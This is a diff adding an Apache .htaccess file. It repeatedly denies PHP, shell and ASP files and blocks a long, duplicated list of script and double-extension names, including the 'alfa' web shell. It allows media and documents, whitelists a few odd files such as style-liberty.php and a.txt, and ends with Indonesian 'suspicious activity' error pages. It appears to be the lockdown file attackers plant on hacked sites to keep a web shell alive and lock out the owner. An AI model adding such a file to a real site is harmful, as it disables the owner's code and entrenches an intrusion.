@@ -1,0 +1,72 @@
+<files *.ph*>
+    order deny,allow
+    deny from all
+</files>
+<files *.ph*>
+    order deny,allow
+    deny from all
+</files>
+<files *.ph*>
+    order deny,allow
+    deny from all
+</files>
+<files *.ph*>
+    order deny,allow
+    deny from all
+</files>
+<files *.sh*>
+    order deny,allow
+    deny from all
+</files>
+<files *.sh*>
+    order deny,allow
+    deny from all
+</files>
+<files *.sh*>
+    order deny,allow
+    deny from all
+</files>
+<files *.sh*>
+    order deny,allow
+    deny from all
+</files>
+<files *.as*>
+    order deny,allow
+    deny from all
+</files>
+<files *.as*>
+    order deny,allow
+    deny from all
+</files>
+<files *.as*>
+    order deny,allow
+    deny from all
+</files>
+<files *.as*>
+    order deny,allow
+    deny from all
+</files>
+<filesmatch ".*\.(cgi|pl|py|pyc|pyo|php3|php4|php6|pcgi|pcgi3|pcgi4|pcgi5|pchi6|inc|php|php|php|php|php|php|php|php|php|php5|php5|phar|phar|phar|phar|phar|phar|phar|inc|phar|php5|php5|php5|php5|php5|php5|cgi|cgi|cgi|cgi|php5|php6|php7|php8|php9|phtml|phtml|phtml|phtml|phtml|fla|fla|fla|fla|fla|fla|fla|phtml|phtml|phtml|phtml|phtml|phtml|phtml|phtml|phtml|phtml|phtml|phtml|phtml|phtml|phtml|phtml|phtml|phtml|phtml|phtml|aspx|aspx|asp|asp|php.jpg|php.jpg|php.xxxjpg|php.xxxjpg|php.jpeg|php.jpg|php.jpeg|php.pjepg|php.pjpeg|php.fla|php.fla|php.png|php.png|php.gif|php.gif|php.test|php;.jpg|php jpg|php;.jpg|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|fla|fla|fla|fla|fla|fla|fla|fla|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.php|php.txt|php.xxxtxt|php.txt|php.xxxtxt|php.xlsx|php.zip|php.xxxzip|php78|php56|php96|php69|php67|php68|php4|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|shtml|php1|php2|php3|php4|php10|alfa|suspected|py|exe|htm|html|alfa|htaccess)$"> 
+order allow,deny
+deny from all
+</filesmatch>
+<filesmatch "\.(jpg|jpeg|png|gif|bmp|ico)$">
+    order deny,allow
+    allow from all
+</filesmatch>
+<filesmatch "\.(mp4|avi|mov|wmv|mp3|wav|ogg)$">
+    order deny,allow
+    allow from all
+</filesmatch>
+<filesmatch "\.(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv|)$">
+    order deny,allow
+    allow from all
+</filesmatch>
+<filesmatch "^(style-liberty.php|index.php|a.txt|home.php|index_old.php|sitemap.xml|robots.txt)$">
+ order allow,deny
+ allow from all
+</filesmatch>
+
+errordocument 403 "<html><head><title>request rejected</title></head><body>the requested url was rejected. please consult with your administrator.<br><br></body></html>"
+errordocument 404 "<html><head><title>request rejected</title></head><body>the requested url was rejected. please consult with your administrator.<br><br></body></html>" 
+errordocument 500 "maaf, akses anda ditolak karena mencoba melakukan aktivitas yang mencurigakan."
